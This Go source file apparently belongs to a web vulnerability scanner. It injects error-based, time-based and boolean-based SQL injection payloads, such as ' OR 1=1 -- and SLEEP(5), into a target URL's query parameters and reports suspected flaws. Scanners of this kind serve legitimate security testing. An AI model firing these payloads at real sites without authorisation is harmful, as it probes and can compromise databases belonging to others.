package scan

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type SQLiScanner struct {
	target     string
	results    []SQLiResult
	httpClient *http.Client
}

type SQLiResult struct {
	URL         string
	Parameter   string
	Type        string
	Payload     string
	Evidence    string
	Severity    string
	Confirmed   bool
}

func NewSQLiScanner(target string) *SQLiScanner {
	return &SQLiScanner{
		target:  target,
		results: []SQLiResult{},
		httpClient: &http.Client{
			Timeout: 10 * time.Second,
		},
	}
}

func (ss *SQLiScanner) Scan() ([]SQLiResult, error) {
	fmt.Println("🔍 开始SQL注入检测...")

	ss.testErrorBased()
	ss.testTimeBased()
	ss.testBooleanBased()

	fmt.Printf("✅ SQL注入检测完成，发现 %d 个漏洞\n", len(ss.results))
	return ss.results, nil
}

func (ss *SQLiScanner) testErrorBased() {
	errorPayloads := []string{
		"'",
		"''",
		"' OR '1'='1",
		"' OR '1'='1' --",
		"' OR '1'='1' /*",
		"' OR 1=1",
		"' OR 1=1 --",
		"' OR 1=1 /*",
		"' UNION SELECT NULL--",
		"' UNION SELECT NULL,NULL--",
		"' AND 1=1 --",
		"' AND 1=2 --",
	}

	errorPatterns := []string{
		"SQL syntax",
		"mysql_fetch",
		"mysql_num_rows",
		"ORA-",
		"Oracle error",
		"Microsoft OLE DB Provider",
		"ODBC SQL Server Driver",
		"SQLServer JDBC Driver",
		"PostgreSQL query failed",
		"pg_query",
		"sqlite_query",
		"SQLite/JDBCDriver",
		"System.Data.SQLite",
	}

	parsedURL, err := url.Parse(ss.target)
	if err != nil {
		return
	}

	query := parsedURL.Query()
	for param := range query {
		for _, payload := range errorPayloads {
			testURL := ss.target
			if strings.Contains(testURL, "?") {
				testURL = strings.Replace(testURL, param+"="+query.Get(param), param+"="+url.QueryEscape(payload), 1)
			}

			resp, err := ss.httpClient.Get(testURL)
			if err != nil {
				continue
			}

			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}

			bodyStr := string(body)
			for _, pattern := range errorPatterns {
				if strings.Contains(bodyStr, pattern) {
					result := SQLiResult{
						URL:       testURL,
						Parameter: param,
						Type:      "Error-based SQL Injection",
						Payload:   payload,
						Evidence:  pattern,
						Severity:  "High",
						Confirmed: false,
					}
					ss.results = append(ss.results, result)
					fmt.Printf("⚠️  发现SQL注入: %s (参数: %s)\n", testURL, param)
					return
				}
			}
		}
	}
}

func (ss *SQLiScanner) testTimeBased() {
	timePayloads := []struct {
		Payload string
		Delay   time.Duration
	}{
		{"' AND SLEEP(5) --", 5 * time.Second},
		{"' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --", 5 * time.Second},
		{"'; WAITFOR DELAY '0:0:5' --", 5 * time.Second},
		{"' AND pg_sleep(5) --", 5 * time.Second},
	}

	parsedURL, err := url.Parse(ss.target)
	if err != nil {
		return
	}

	query := parsedURL.Query()
	for param := range query {
		for _, tp := range timePayloads {
			testURL := ss.target
			if strings.Contains(testURL, "?") {
				testURL = strings.Replace(testURL, param+"="+query.Get(param), param+"="+url.QueryEscape(tp.Payload), 1)
			}

			start := time.Now()
			resp, err := ss.httpClient.Get(testURL)
			if err != nil {
				continue
			}
			resp.Body.Close()
			elapsed := time.Since(start)

			if elapsed > tp.Delay {
				result := SQLiResult{
					URL:       testURL,
					Parameter: param,
					Type:      "Time-based SQL Injection",
					Payload:   tp.Payload,
					Evidence:  fmt.Sprintf("响应时间: %v", elapsed),
					Severity:  "High",
					Confirmed: false,
				}
				ss.results = append(ss.results, result)
				fmt.Printf("⚠️  发现SQL注入: %s (参数: %s)\n", testURL, param)
				return
			}
		}
	}
}

func (ss *SQLiScanner) testBooleanBased() {
	boolPayloads := []struct {
		True  string
		False string
	}{
		{"' AND '1'='1", "' AND '1'='2"},
		{"' OR '1'='1", "' OR '1'='2"},
	}

	parsedURL, err := url.Parse(ss.target)
	if err != nil {
		return
	}

	query := parsedURL.Query()
	for param := range query {
		for _, bp := range boolPayloads {
			trueURL := ss.target
			falseURL := ss.target
			if strings.Contains(trueURL, "?") {
				trueURL = strings.Replace(trueURL, param+"="+query.Get(param), param+"="+url.QueryEscape(bp.True), 1)
				falseURL = strings.Replace(falseURL, param+"="+query.Get(param), param+"="+url.QueryEscape(bp.False), 1)
			}

			trueResp, err := ss.httpClient.Get(trueURL)
			if err != nil {
				continue
			}
			trueBody, _ := io.ReadAll(trueResp.Body)
			trueResp.Body.Close()

			falseResp, err := ss.httpClient.Get(falseURL)
			if err != nil {
				continue
			}
			falseBody, _ := io.ReadAll(falseResp.Body)
			falseResp.Body.Close()

			if len(trueBody) != len(falseBody) {
				result := SQLiResult{
					URL:       trueURL,
					Parameter: param,
					Type:      "Boolean-based SQL Injection",
					Payload:   bp.True,
					Evidence:  fmt.Sprintf("True响应长度: %d, False响应长度: %d", len(trueBody), len(falseBody)),
					Severity:  "High",
					Confirmed: false,
				}
				ss.results = append(ss.results, result)
				fmt.Printf("⚠️  发现SQL注入: %s (参数: %s)\n", trueURL, param)
				return
			}
		}
	}
}

func (ss *SQLiScanner) GetResults() []SQLiResult {
	return ss.results
}
